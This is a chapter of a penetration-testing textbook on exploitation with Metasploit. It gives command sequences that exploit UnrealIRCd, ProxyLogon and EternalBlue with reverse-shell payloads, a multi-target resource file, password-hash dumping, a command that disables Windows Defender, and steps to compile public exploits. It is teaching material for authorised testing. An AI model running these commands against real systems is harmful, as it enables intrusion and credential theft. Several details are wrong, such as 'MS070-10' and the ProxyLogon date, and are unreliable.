<html><head></head><body>
  <div id="_idContainer428" class="Basic-Text-Frame">
    <h1 class="chapterNumber">10</h1>
    <h1 id="_idParaDest-240" class="chapterTitle">Exploitation</h1>
    <p class="normal">The key purpose of a penetration test is to exploit a data system and gain the credentials or direct access to the data of interest. It is exploitation that gives penetration testing its meaning. In this chapter, we will examine various means of exploiting systems, including both public exploits and available exploit frameworks. By the end of this chapter, you should be able to understand the following:</p>
    <ul>
      <li class="bulletList">The Metasploit Framework</li>
      <li class="bulletList">The exploitation of targets using Metasploit</li>
      <li class="bulletList">Using public exploits</li>
      <li class="bulletList">Developing sample Windows-specific exploits</li>
      <li class="bulletList">Empire PowerShell Framework</li>
    </ul>
    <h1 id="_idParaDest-241" class="heading-1">The Metasploit Framework</h1>
    <p class="normal">The <strong class="keyWord">Metasploit Framework</strong> (<strong class="keyWord">MSF</strong>) is an<a id="_idIndexMarker1099"/> open-source tool designed to facilitate penetration testing. Written in the Ruby programming language, it uses a modular approach to facilitating exploits during the exploitation phase in cyber kill chain methodology. This makes it easier to develop and code exploits, and it also allows for complex attacks to be easily implemented.</p>
    <p class="normal"><em class="italic">Figure 10.1</em> depicts an overview of the MSF architecture and components:</p>
    <figure class="mediaobject"><img src="../Images/B17765_10_01.png" alt=""/></figure>
    <p class="packt_figref">Figure 10.1: Metasploit architecture and its components</p>
    <p class="normal">The framework <a id="_idIndexMarker1100"/>can be split into three main sections:</p>
    <ul>
      <li class="bulletList">Libraries</li>
      <li class="bulletList">Interfaces</li>
      <li class="bulletList">Modules</li>
    </ul>
    <h2 id="_idParaDest-242" class="heading-2">Libraries</h2>
    <p class="normal">MSF is built <a id="_idIndexMarker1101"/>using various functions and libraries and a programming language, such as Ruby. To utilize these functions, penetration testers must understand what these functions are, how to trigger them, what parameters should be passed to the function, and what the expected results are.</p>
    <p class="normal">All of the libraries are listed in the <code class="inlineCode">/usr/share/Metasploit-framework/lib/</code> folder, as shown<a id="_idIndexMarker1102"/> in <em class="italic">Figure 10.2</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_10_02.png" alt="Graphical user interface, text  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 10.2: Metasploit libraries folder</p>
    <h3 id="_idParaDest-243" class="heading-3">REX</h3>
    <p class="normal">REX is a library <a id="_idIndexMarker1103"/>included in Metasploit that was initially developed by Jackob Hanmack and was made official by the Rapid 7 development team later on. This library provides various classes that are useful for exploit development. In the current MSF, REX handles all of the core functions such as socket connections, raw functions, and other reformatting.</p>
    <h3 id="_idParaDest-244" class="heading-3">Framework core</h3>
    <p class="normal">This library <a id="_idIndexMarker1104"/>is located in <code class="inlineCode">/usr/share/metasploit-framework/lib/msf/core</code>, which provides the basic <strong class="keyWord">Application Programming Interface</strong> (<strong class="keyWord">API</strong>) for all <a id="_idIndexMarker1105"/>the new modules that are going to be written.</p>
    <h3 id="_idParaDest-245" class="heading-3">Framework base</h3>
    <p class="normal">This library<a id="_idIndexMarker1106"/> provides a good API for sessions, a shell, Meterpreter, VNC, and other default APIs, but it is dependent on Framework core.</p>
    <p class="normal">Other extended parts that can be a part of MSF include custom plugins, protocol tools, security tools, web services, and other integration services.</p>
    <h2 id="_idParaDest-246" class="heading-2">Interfaces</h2>
    <p class="normal">MSF used to <a id="_idIndexMarker1107"/>have multiple interfaces, such as a command-line interface, web interface, and others. All of the interfaces were sunset by the Rapid 7 development team in the latest versions (Community and Pro). In this chapter, we will explore the console and GUI (Armitage) interfaces. The console interface is the fastest because it presents attack commands, and it has the required configuration parameters in an easy-to-use interface.</p>
    <p class="normal">To access this interface, enter <code class="inlineCode">sudo msfconsole</code> in a command prompt. <em class="italic">Figure 10.3</em> shows the splash screen that appears when the application launches:</p>
    <figure class="mediaobject"><img src="../Images/B17765_10_03.png" alt="Graphical user interface, chart  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 10.3: Metasploit console main menu</p>
    <h2 id="_idParaDest-247" class="heading-2">Modules</h2>
    <p class="normal">MSF consists of <a id="_idIndexMarker1108"/>modules that are combined to affect an exploit. The modules and their specific functions are as follows:</p>
    <ul>
      <li class="bulletList"><strong class="keyWord">Exploits</strong>: The code fragments that target specific vulnerabilities. Active exploits will exploit a specific target, run until completed, and then exit (for example, a buffer overflow). Passive exploits wait for incoming hosts, such as web browsers or FTP clients, and exploit them when they connect.</li>
      <li class="bulletList"><strong class="keyWord">Payloads</strong>: These are the malicious code that implement commands immediately following a successful exploitation.</li>
      <li class="bulletList"><strong class="keyWord">Auxiliary modules</strong>: These modules do not establish or directly support access between the tester and the target system; instead, they perform related functions such <a id="_idIndexMarker1109"/>as scanning, fuzzing, or sniffing, which support the exploitation phase.</li>
      <li class="bulletList"><strong class="keyWord">Post modules</strong>: Following a successful attack, these modules run on compromised targets to gather useful data and pivot the attacker deeper into the target network. We will learn more about the post modules in <em class="chapterRef">Chapter 11</em>, <em class="italic">Action on the Objective and Lateral Movement</em>.</li>
      <li class="bulletList"><strong class="keyWord">Encoders</strong>: When exploits must bypass antivirus defenses, these modules encode the payload so that it cannot be detected using signature matching techniques.</li>
      <li class="bulletList"><strong class="keyWord">No operations</strong> (<strong class="keyWord">NOPs</strong>): These are used to facilitate buffer overflows during attacks.</li>
    </ul>
    <p class="normal">These modules are used together to conduct reconnaissance and launch attacks against targets. The steps for exploiting a target system using MSF can be summarized as follows:</p>
    <ol class="numberedList" style="list-style-type: decimal;">
      <li class="numberedList" value="1">Choose and configure an exploit (the code that compromises a specific vulnerability on the target system).</li>
      <li class="numberedList">Check the target system to determine whether it is susceptible to attack by the exploit. This step is optional and is usually omitted to minimize detection.</li>
      <li class="numberedList">Choose and configure the payload (the code that will be executed on the target system following a successful exploitation; for example, a reverse shell from the compromised system back to the source).</li>
      <li class="numberedList">Choose an encoding technique to bypass detection controls (IDs/IPs or antivirus software).</li>
      <li class="numberedList">Execute<a id="_idIndexMarker1110"/> the exploit.</li>
    </ol>
    <h2 id="_idParaDest-248" class="heading-2">Database setup and configuration</h2>
    <p class="normal">It is fairly simple <a id="_idIndexMarker1111"/>to set up the new version of Metasploit, since<a id="_idIndexMarker1112"/> Metasploit does not run as a service anymore, since version <code class="inlineCode">msf3</code>:</p>
    <ol class="numberedList" style="list-style-type: decimal;">
      <li class="numberedList" value="1">Start PostgreSQL by running <code class="inlineCode">sudo systemctl start postgresql.service</code> in the terminal.</li>
      <li class="numberedList">Initialize the Metasploit database by running <code class="inlineCode">sudo msfdb init</code>. Unless it is your first time doing this, the initialization will create the <code class="inlineCode">msf</code> database, create a role, and add the <code class="inlineCode">msf_test</code> and <code class="inlineCode">msf</code> databases to the <code class="inlineCode">/usr/share/metasploit-framework/config/database.yml</code> configuration file; otherwise, by default, the <code class="inlineCode">msf</code> database will be created in the prebuild of Kali Linux, as shown in <em class="italic">Figure 10.4</em>:<figure class="mediaobject"><img src="../Images/B17765_10_04.png" alt="Text  Description automatically generated"/></figure>
        <p class="packt_figref">Figure 10.4: Initializing the Metasploit database</p>
      </li>
      <li class="numberedList">Now, you are ready to access <code class="inlineCode">msfconsole</code>.</li>
      <li class="numberedList">Once inside the console, you can verify the status of the database by typing <code class="inlineCode">db_status</code>. You should be able to see the following:
        <pre class="programlisting con"><code class="hljs-con">msf6 &gt; db_status 
[*] Connected to msf. Connection type: postgresql.
</code></pre>
      </li>
      <li class="numberedList">In the case of there being multiple targets, all of which are different company units, or maybe two different companies, it is a good practice to create a workspace within Metasploit. This can be achieved by running the <code class="inlineCode">workspace</code> command in the <code class="inlineCode">msfconsole</code>. The following extract shows the help menu, where<a id="_idIndexMarker1113"/> you can add/delete <a id="_idIndexMarker1114"/>workspaces so that you can organize these exploits to achieve your objective:
        <pre class="programlisting con"><code class="hljs-con">msf6 &gt; workspace -h
Usage:
    workspace                  List workspaces
    workspace -v               List workspaces verbosely
    workspace [name]           Switch workspace
    workspace -a [name] ...    Add workspace(s)
    workspace -d [name] ...    Delete workspace(s)
    workspace -D               Delete all workspaces
    workspace -r &lt;old&gt; &lt;new&gt;   Rename workspace
    workspace -h               Show this help information
msf6 &gt; workspace -a Fourthedition
[*] Added workspace: Fourthedition
[*] Workspace: Fourthedition
msf6 &gt; workspace
  default
* Fourthedition
</code></pre>
      </li>
    </ol>
    <p class="normal">The following example represents a simple <strong class="keyWord">Unreal IRCD</strong> attack against the target Linux-based operating system. When installed as a virtual machine (covered in <em class="chapterRef">Chapter 1</em>, <em class="italic">Goal-Based Penetration Testing</em>), Metasploitable3 Ubuntu running on 10.10.10.8 can be scanned using the <code class="inlineCode">db_nmap</code> command, which identifies open ports and associated applications. An excerpt of the <code class="inlineCode">db_nmap</code> scan is shown in <em class="italic">Figure 10.5</em>:</p>
    <pre class="programlisting con"><code class="hljs-con">msf6 &gt; db_nmap -vv -sC -Pn -p- 10.10.10.8 --save
</code></pre>
    <figure class="mediaobject"><img src="../Images/B17765_10_05.png" alt="Text  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 10.5: Running db_nmap scans within Metasploit</p>
    <p class="normal">When the --save option <a id="_idIndexMarker1115"/>is <a id="_idIndexMarker1116"/>used, all the output of the scan results will be saved in <code class="inlineCode">/root/.msf4/local/ folder</code>. Several applications were identified by <code class="inlineCode">nmap</code> in the preceding example. </p>
    <p class="normal">If the scan was completed using <code class="inlineCode">nmap</code> separately, those results can also be imported into Metasploit using the <code class="inlineCode">db_import</code> command. The <code class="inlineCode">nmap</code> output will normally produce three types of output, that is, <code class="inlineCode">xml</code>, <code class="inlineCode">nmap</code>, and <code class="inlineCode">gnmap</code>. </p>
    <p class="normal">The <code class="inlineCode">.xml</code> format can be imported into the database using the Nmap <code class="inlineCode">nokogiri</code> parser. Once the results have been imported into the database, multiple options can be utilized in the case of a large <code class="inlineCode">nmap</code> dataset:</p>
    <figure class="mediaobject"><img src="../Images/B17765_10_06.png" alt="Text  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 10.6: Importing independent Nmap scans into Metasploit</p>
    <p class="normal">As a tester, we should investigate each one for any known vulnerabilities. If we run the <code class="inlineCode">services</code> command in the <code class="inlineCode">msfconsole</code>, the database should include the host and its listed<a id="_idIndexMarker1117"/> services, as<a id="_idIndexMarker1118"/> shown in <em class="italic">Figure 10.7</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_10_07.png" alt="Graphical user interface, text  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 10.7: Listing all the services within Metasploit</p>
    <p class="normal">One of the first places to start is Metasploit’s own collection of exploits. This can be searched from the command line using the following command:</p>
    <pre class="programlisting con"><code class="hljs-con">msf&gt; search UnrealIRCd
</code></pre>
    <p class="normal">The search returned a particular exploit for the <code class="inlineCode">UnrealIRCd</code> service. <em class="italic">Figure 10.8</em> shows an excerpt of the exploit that’s available. If the testers choose to exploit any other listed service, they can search for keywords in Metasploit:</p>
    <figure class="mediaobject"><img src="../Images/B17765_10_08.png" alt="Graphical user interface, text, application, chat or text message  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 10.8: Keyword searching within the Metasploit console for exploits</p>
    <p class="normal">The new version of Metasploit indexes modules and allows testers to just enter the number in the index to use it. The <code class="inlineCode">exploit/unix/irc/unreal_ircd_3281_backdoor</code> exploit was selected for use in the remainder of this example because it is ranked as excellent. This <a id="_idIndexMarker1119"/>ranking was determined by the<a id="_idIndexMarker1120"/> Metasploit development team and identifies how reliably the exploit works for a skilled tester against a stable target system. In real life, multiple variables (tester skills, protective devices on the network, and modifications to the operating system and hosted applications) can work together to significantly alter the reliability of the exploit.</p>
    <p class="normal">Additional information pertaining to that exploit was obtained using the following <code class="inlineCode">info</code> command:</p>
    <pre class="programlisting con"><code class="hljs-con">msf&gt; info 0
</code></pre>
    <p class="normal">The returned information includes references as well as the information that’s shown in <em class="italic">Figure 10.9</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_10_09.png" alt="Text  Description automatically generated with medium confidence"/></figure>
    <p class="packt_figref">Figure 10.9: Detailed information about the exploit using the info command</p>
    <p class="normal">To instruct Metasploit that we will attack the target with this exploit, we issue the following command:</p>
    <pre class="programlisting con"><code class="hljs-con">Msf6&gt; use exploit/unix/irc/unreal_ircd_3281_backdoor  
</code></pre>
    <p class="normal">Metasploit<a id="_idIndexMarker1121"/> changes <a id="_idIndexMarker1122"/>the command prompt from <code class="inlineCode">msf&gt;</code> to <code class="inlineCode">msf exploit(unix/irc/unreal_ircd_3281_backdoor) &gt;</code>.</p>
    <p class="normal">Metasploit prompts the tester to select the payload (a reverse shell from the compromised system back to the attacker) and sets the other variables, which are listed as follows:</p>
    <ul>
      <li class="bulletList"><strong class="keyWord">Remote host</strong> (<strong class="keyWord">RHOST</strong>): This is<a id="_idIndexMarker1123"/> the IP address of the system being attacked.</li>
      <li class="bulletList"><strong class="keyWord">Remote port</strong> (<strong class="keyWord">RPORT</strong>): This is the port number that is used for the exploit. In this case, we can see that the service has been exploited on default port <code class="inlineCode">6667</code>, but in our case, the same service is running on port <code class="inlineCode">6697</code>.</li>
      <li class="bulletList"><strong class="keyWord">Local host</strong> (<strong class="keyWord">LHOST</strong>): This is the IP address of the system that’s used to launch the attack.</li>
    </ul>
    <p class="normal">The attack is launched by entering the <code class="inlineCode">exploit</code> command at the Metasploit prompt after all variables <a id="_idIndexMarker1124"/>have<a id="_idIndexMarker1125"/> been set. Metasploit initiates the attack and confirms that a reverse shell between Kali Linux and the target system is open. In other exploits, a successful exploit is presented by using <code class="inlineCode">command shell 1 opened</code> and giving the IP addresses that originate and terminate the reverse shell.</p>
    <p class="normal">To verify that a shell is present, the tester can issue queries for the hostname, username (<code class="inlineCode">uname -a</code>), and <code class="inlineCode">whoami</code> to confirm that the results are specific to the target system that is located at a remote location. Take a look at <em class="italic">Figure 10.10</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_10_10.png" alt="Text  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 10.10: Successfully exploiting UnrealIRC using Metasploit with a reverse shell</p>
    <p class="normal">This exploit <a id="_idIndexMarker1126"/>can<a id="_idIndexMarker1127"/> further be explored by using post-exploit modules. Run Meterpreter in the background by pressing <em class="keystroke">Ctrl</em> + <em class="keystroke">Z</em>. You should receive <code class="inlineCode">Background session 1? [y/N] y enter y</code>.</p>
    <p class="normal">When a system is compromised to this extent, it is ready for the post-exploitation activities (see <em class="chapterRef">Chapter 11</em>, <em class="italic">Action on the Objective and Lateral Movement</em>, and <em class="chapterRef">Chapter 13</em>, <em class="italic">Command and Control</em>, to find out how to escalate the privilege and maintain access to the system).</p>
    <h1 id="_idParaDest-249" class="heading-1">Exploiting targets using MSF</h1>
    <p class="normal">MSF is equally<a id="_idIndexMarker1128"/> effective against vulnerabilities in the operating system as well as third-party applications. We will take an example for both scenarios.</p>
    <h2 id="_idParaDest-250" class="heading-2">Single targets using a simple reverse shell</h2>
    <p class="normal">In this example, we’ll<a id="_idIndexMarker1129"/> exploit two different vulnerabilities. The first one is the famous ProxyLogon vulnerability that the Hafnium threat actor group exploited by misuing Microsoft Exchange Server in March 2021, which stormed the internet and led to many cybersecurity incidents and also financial fraud around the globe. There are four vulnerabilities that were primarily<a id="_idIndexMarker1130"/> exploited: </p>
    <ul>
      <li class="bulletList"><strong class="keyWord">CVE-2021-26855</strong>: <strong class="keyWord">Server Side Request Forgery</strong> (<strong class="keyWord">SSRF</strong>) – Where attackers are able to submit<a id="_idIndexMarker1131"/> specifically crafted HTTP requests remotely without any authentication and the server accepts untrusted connections on TCP port <code class="inlineCode">443</code>. </li>
      <li class="bulletList"><strong class="keyWord">CVE-2021-26857</strong> – An insecure deserialization vulnerability within the Microsoft<a id="_idIndexMarker1132"/> Exchange <strong class="keyWord">Unified Messaging Service</strong> (<strong class="keyWord">UMS</strong>), allowing attackers to run malicious code under a high-privilege SYSTEM account. This can be exploited either with SSRF or stolen credentials.</li>
      <li class="bulletList"><strong class="keyWord">CVE-2021-26858</strong> and <strong class="keyWord">CVE-2021-27065</strong> – These both relate to arbitrary file write vulnerability to write files to a given directory. </li>
    </ul>
    <p class="normal">In the following example, we will be demonstrating a combination of <strong class="keyWord">CVE-2021-26855</strong>, to bypass the authentication and additionally impersonate an administrator account, and <strong class="keyWord">CVE-2021-27065</strong> to write an arbitrary file with the payload to provide us with remote code execution on the server.</p>
    <p class="normal">As the first step, attackers will need the target running on-premises Microsoft Exchange Server exposed and enumerate all the email addresses to perform a successful attack. Testers can leverage the Python ProxyShell enumeration script to list all the users who are connected to the Exchange servers. This script is available at <a href="https://github.com/PacktPublishing/Mastering-Kali-Linux-for-Advanced-Penetration-Testing-4E/blob/main/Chapter%2010/ProxyShell-enumerate.py"><span class="url">https://github.com/PacktPublishing/Mastering-Kali-Linux-for-Advanced-Penetration-Testing-4E/blob/main/Chapter%2010/ProxyShell-enumerate.py</span></a>. </p>
    <p class="normal">Attackers can run <code class="inlineCode">python3 proxyshell-enumerate.py –u &lt;Exchange server IP</code>&gt;. The output of the script against the target should display all the email addresses within the Exchange server, as seen in <em class="italic">Figure 10.11</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_10_11.png" alt=""/></figure>
    <p class="packt_figref">Figure 10.11: Enumeration of user email addresses on the Exchange server</p>
    <p class="normal">To initiate this <a id="_idIndexMarker1133"/>attack, the first step is to open MSF by running the following, as shown in <em class="italic">Figure 10.12</em>:</p>
    <pre class="programlisting con"><code class="hljs-con">sudo msfconsole 
search proxylogon
use exploit/windows/http/exchange_proxylogon_rce
set payload windows/meterpreter/reverse_https
set rhosts &lt;your Exchange server IP&gt;
set email &lt;administrator email id&gt;
set lhost &lt;Your Kali IP&gt;
set lport &lt;You kali port&gt;
</code></pre>
    <figure class="mediaobject"><img src="../Images/B17765_10_12.png" alt=""/></figure>
    <p class="packt_figref">Figure 10.12: Running the exploit on the Exchange vulnerability</p>
    <div class="packt_tip">
      <p class="normal">If there are any error messages or if the exploit is completed without a Meterpreter shell, ensure you disable Defender in the Microsoft Exchange Server by running <code class="inlineCode">Set-MpPreference -DisableRealtimeMonitoring $true</code> in PowerShell as an administrator. </p>
    </div>
    <p class="normal">Successful <a id="_idIndexMarker1134"/>exploitation results in arbitrary code execution under the context of the high-privileged SYSTEM user. Successful execution of the code should provide you with the Meterpreter shell shown in <em class="italic">Figure 10.13</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_10_13.png" alt=""/></figure>
    <p class="packt_figref">Figure 10.13: Successful exploitation leading to the Meterpreter HTTPS reverse shell</p>
    <p class="normal">When the exploit is completed, it should open up the Meterpreter reverse shell between two systems. The Meterpreter prompt session will be opened up and the tester can effectively access the remote system with a command shell. One of the first steps after the compromise is to verify that you are on the target system. As you can see in <em class="italic">Figure 10.14</em>, the <code class="inlineCode">sysinfo</code> command identifies the computer name and operating system, verifying <a id="_idIndexMarker1135"/>a successful attack: </p>
    <figure class="mediaobject"><img src="../Images/B17765_10_14.png" alt=""/></figure>
    <p class="packt_figref">Figure 10.14: System information of the compromised server</p>
    <p class="normal">The second exploit that we will explore in this section is MS070-10, which rocked the world with WannaCry ransomware by exploiting EternalBlue back in April 2017. The vulnerability exists in the way the SMB version was implemented in Windows, specifically, SMBv1 and NBT over TCP ports <code class="inlineCode">445</code> and port <code class="inlineCode">139</code> – which is used to share data in a secure way. </p>
    <p class="normal">A successful exploit results in an adversary being able to run arbitrary code on the remote system. Although this exploit is old, many organizations still have to rely on some legacy systems. This might be due to various reasons, such as OEM dependency or the business simply cannot get rid of of old systems, such as Windows XP, 7, 2003, Windows 2008, and Windows 2008 R2. To demonstrate how easy it is to exploit these legacy systems, we would utilize Metasploitable3 (running on <code class="inlineCode">10.10.10.4</code>) to conduct <a id="_idIndexMarker1136"/>this exploitation by setting the following in the Kali terminal:</p>
    <pre class="programlisting con"><code class="hljs-con">sudo msfconsole 
search eternal
use exploit/windows/smb/ms17_010_eternalblue 
set payload windows/meterpreter/reverse_https
set rhosts &lt;your Exchange server IP&gt;
set lhost &lt;Your Kali IP&gt;
set lport &lt;You kali port&gt;
</code></pre>
    <figure class="mediaobject"><img src="../Images/B17765_10_15.png" alt=""/></figure>
    <p class="packt_figref">Figure 10.15: Exploitation of EternalBlue using Metasploit</p>
    <p class="normal">Finally, exploitation should provide us with a similar Meterpreter shell to what we saw in the previous exploit. The <code class="inlineCode">hashdump</code> command should disclose all the usernames and password hashes, as<a id="_idIndexMarker1137"/> shown in <em class="italic">Figure 10.16</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_10_16.png" alt="A screenshot of a computer  Description automatically generated with low confidence"/></figure>
    <p class="packt_figref">Figure 10.16: Extracting usernames and hashes using hashdump within Meterpreter</p>
    <p class="normal">Furthermore, to store <a id="_idIndexMarker1138"/>this information for the enhancement of lateral movement within the network, testers can utilize the <code class="inlineCode">incognito</code> and <code class="inlineCode">kiwi</code> modules within the <code class="inlineCode">msfconsole</code>. </p>
    <h1 id="_idParaDest-251" class="heading-1">Exploiting multiple targets using MSF resource files</h1>
    <p class="normal">MSF resource<a id="_idIndexMarker1139"/> files are basically line-separated text files that include a sequence of commands that need to be executed in <code class="inlineCode">msfconsole</code>. Let’s go ahead and create a resource file that can exploit the same vulnerability on multiple hosts:</p>
    <pre class="programlisting con"><code class="hljs-con">use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/reverse_tcp
set rhost xx.xx.xx.xx
set lhost xx.xx.xx.xx
set lport 4444
exploit -j
use exploit/windows/http/exchange_proxylogon_rce
set payload windows/meterpreter/reverse_https
set rhost xx.xx.xx.xx
set lhost xx.xx.xx.xx
set lport 443
exploit -j
</code></pre>
    <p class="normal">Save the file as <code class="inlineCode">multiexploit.rc</code>. Now you are ready to invoke the resource file by running <code class="inlineCode">msfconsole -r filename.rc</code>, where <code class="inlineCode">-r</code> refers to the resource file. The preceding resource file will exploit the same vulnerability sequentially. Once the first exploit is complete, the specification of <code class="inlineCode">exploit -j</code> will move the running exploit to the background, allowing the next exploit to proceed. Once all of the targets’ exploitation is complete, we <a id="_idIndexMarker1140"/>should be able to see multiple Meterpreter shells available in Metasploit.</p>
    <div class="note">
      <p class="normal">If the exploit is designed to run only on one host, it may not be possible to enter multiple hosts or IP ranges in the exploit. However, the alternative is to run the same exploit with different port numbers per host. We will be discussing pre-existing MSF resource files that can be utilized while escalating privileges in more detail in the next chapter.</p>
    </div>
    <h1 id="_idParaDest-252" class="heading-1">Using public exploits</h1>
    <p class="normal">Every attacker <a id="_idIndexMarker1141"/>always has their eyes out, looking for public exploits and modifying them according to their requirements. The latest exploit was on August 6, 2021, that is, ProxyLogon, which shook most of the companies running on-premises Exchange servers that host all their mission-critical business emails, thus creating an awareness of what information theft malware is all about. However, in this section, we will take a deep dive into utilizing known available exploit forums and also how we can <a id="_idIndexMarker1142"/>onboard them into our Kali Linux system.</p>
    <h2 id="_idParaDest-253" class="heading-2">Locating and verifying publicly available exploits</h2>
    <p class="normal">Many a <a id="_idIndexMarker1143"/>time, penetration testers find <a id="_idIndexMarker1144"/>a zero-day exploit during their tests, which they normally inform the company of. However, in the case of real attackers, any vulnerabilities that are found will be made into an exploit, which is then sold for money/fame to companies such as VUPEN. One of the important aspects of penetration testing is to find publicly available exploits on the internet and provide proof of concept.</p>
    <p class="normal">The initial exploit database that was born on the internet was Milw0rm. Using the same concept, we can see multiple similar databases that can be utilized by the penetration testing community. The following is a list of places where attackers would primarily look for exploits:</p>
    <ul>
      <li class="bulletList"><strong class="keyWord">Exploit-DB</strong> (<strong class="keyWord">EDB</strong>): The<a id="_idIndexMarker1145"/> name says it all—it is a database archive of public exploits on the internet, along with the software versions that are vulnerable. EDB was developed by vulnerability researchers and penetration testers, who are driven by the community. <p class="normal">Penetration testers often use Exploit-DB as a proof of concept rather than an advisory tool, making it more valuable during a penetration test or red team exercise: </p>
        <ul>
          <li class="bulletList">EDB is embedded into Kali Linux 2.0 as part of the build release and it has made it fairly simple to search for all the available exploits through SearchSploit. The <a id="_idIndexMarker1146"/>advantage of EDB is that it’s also <strong class="keyWord">common vulnerabilities and exposures </strong>(<strong class="keyWord">CVEs</strong>) compatible. Wherever applicable, the exploits will include the CVE details.</li>
        </ul>
      </li>
      <li class="bulletList"><strong class="keyWord">SearchSploit: </strong>SearchSploit <a id="_idIndexMarker1147"/>is a simple utility in Kali Linux for finding all the exploits from EDB with a keyword search to narrow down an attack. Once you open the terminal and type <code class="inlineCode">searchsploit exchange windows remote</code>, you should be able to see the following:<figure class="mediaobject"><img src="../Images/B17765_10_17.png" alt=""/></figure>
        <p class="packt_figref">Figure 10.17: Searching for custom exploits from searchsploit</p>
      </li>
    </ul>
    <h2 id="_idParaDest-254" class="heading-2">Compiling and using exploits</h2>
    <p class="normal">Attackers will <a id="_idIndexMarker1148"/>collate<a id="_idIndexMarker1149"/> all the relevant exploits, publish and compile them, and make them ready to use as a weapon to exploit the target. In this section, we will take a deep dive into compiling different types of files and add all the exploits written in Ruby that have <code class="inlineCode">msfcore</code> as the base of Metasploit modules.</p>
    <h3 id="_idParaDest-255" class="heading-3">Compiling C files and executing exploits</h3>
    <p class="normal">Older versions of <a id="_idIndexMarker1150"/>exploits are written in C, especially <a id="_idIndexMarker1151"/>buffer overflow attacks. Let’s look at an example of compiling a C file from the EDB and make an exploit for a vulnerable Apache server.</p>
    <p class="normal">Attackers can utilize a GNU compiler collection to compile a C file into an executable with the following commands:</p>
    <pre class="programlisting con"><code class="hljs-con">cp /usr/share/exploitdb/exploits/windows/remote/3996.c apache.c
gcc apache.c -o apache
./apache
</code></pre>
    <p class="normal">Once the file is compiled without any error or warning, attackers should be able to see the exploit <a id="_idIndexMarker1152"/>running, as<a id="_idIndexMarker1153"/> shown in <em class="italic">Figure 10.18</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_10_18.png" alt=""/></figure>
    <p class="packt_figref">Figure 10.18: Compiling a C file and running it from EDB</p>
    <h3 id="_idParaDest-256" class="heading-3">Adding the exploits that are written using the MSF as a base</h3>
    <p class="normal">Copy the<a id="_idIndexMarker1154"/> exploit file/script either from <code class="inlineCode">exploit-db.com</code> directly from the browser or from <code class="inlineCode">/usr/share/exploitdb/exploits/</code>, depending on the platform and the type of exploit you are running.</p>
    <p class="normal">In this example, we will use <code class="inlineCode">/usr/share/exploitdb/exploits/windows/remote/16756.rb</code>.</p>
    <p class="normal">Add the Ruby script as a custom exploit to the Metasploit module, move or copy the file to <code class="inlineCode">/usr/share/metasploit-framework/modules/exploits/windows/http/</code>, and name the file <code class="inlineCode">NewExploit.rb</code>:</p>
    <pre class="programlisting con"><code class="hljs-con">sudo cp /usr/share/exploitdb/exploits/windows/remote/16756.rb /usr/share/metasploit-framework/modules/exploits/windows/http/NewExploit.rb
</code></pre>
    <p class="normal">Once the file has been copied or moved to its new location, you must restart <code class="inlineCode">msfconsole</code> just to ensure that the file has been loaded into the available module in Metasploit. You <a id="_idIndexMarker1155"/>will be able to use the module with your custom name that you set as part of the available Metasploit module:</p>
    <figure class="mediaobject"><img src="../Images/B17765_10_19.png" alt="Text  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 10.19: Adding custom exploits to the Metasploit Framework from EDB</p>
    <p class="normal">That concludes adding an existing exploit in EDB to Metasploit. We will explore writing our own custom<a id="_idIndexMarker1156"/> exploit in the next section.</p>
    <h1 id="_idParaDest-257" class="heading-1">Developing a Windows exploit</h1>
    <p class="normal">Exploit <a id="_idIndexMarker1157"/>development is a tough art that requires attackers to have a fair bit of understanding of the assembly language and underlying system architecture. We can utilize the following five-stage approach to develop a custom exploit: </p>
    <figure class="mediaobject"><img src="../Images/B17765_10_20.png" alt="Text, application  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 10.20: Five-stage custom exploit development</p>
    <p class="normal">In this section, we will cover some basics that are required to develop a Windows exploit by building a vulnerable application. From the exploit development perspective, the following are the basic terms that penetration testers must understand when they develop an exploit:</p>
    <ul>
      <li class="bulletList"><strong class="keyWord">Registers</strong>: All of the processes execute via registers; these are used to store information.</li>
      <li class="bulletList"><strong class="keyWord">x86</strong>: This includes 32-bit systems that are mostly Intel-based; 64-bit systems are represented as x64.</li>
      <li class="bulletList"><strong class="keyWord">Assembly language</strong>: This includes low-level programming languages.</li>
      <li class="bulletList"><strong class="keyWord">Buffer</strong>: This is a static memory holder in a program that stores data on top of the stack or heap.</li>
      <li class="bulletList"><strong class="keyWord">Debugger</strong>: Debuggers are the programs that can be utilized so that you can see the runtime of a program while executing. You can also use them to look at the state of registry and memory. Some of the tools that we will be using are immunity debuggers, GDB, and OllyDbg.</li>
      <li class="bulletList"><strong class="keyWord">ShellCode</strong>: This is the code that is created by the attackers in a successful exploitation.</li>
    </ul>
    <p class="normal">The following are<a id="_idIndexMarker1158"/> the different<a id="_idIndexMarker1159"/> types of registers:</p>
    <ul>
      <li class="bulletList"><strong class="keyWord">EAX</strong>: This is a 32-bit register that is used as an accumulator and stores data and operands.</li>
      <li class="bulletList"><strong class="keyWord">EBX</strong>: This is a 32-bit base register and acts as a pointer to the data.</li>
      <li class="bulletList"><strong class="keyWord">ECX</strong>: This is a 32-bit register that’s used for looping purposes.</li>
      <li class="bulletList"><strong class="keyWord">EDX</strong>: This is a 32-bit data register that stores I/O pointers.</li>
      <li class="bulletList"><strong class="keyWord">ESI/EDI</strong>: These are 32-bit index registers that act as data pointers for all the memory operations.</li>
      <li class="bulletList"><strong class="keyWord">EBP</strong>: This is a 32-bit stack data pointer register.</li>
      <li class="bulletList"><strong class="keyWord">Extended Instruction Pointer</strong> (<strong class="keyWord">EIP</strong>): This is<a id="_idIndexMarker1160"/> a 32-bit program counter/instruction pointer that holds the next instruction to be executed.</li>
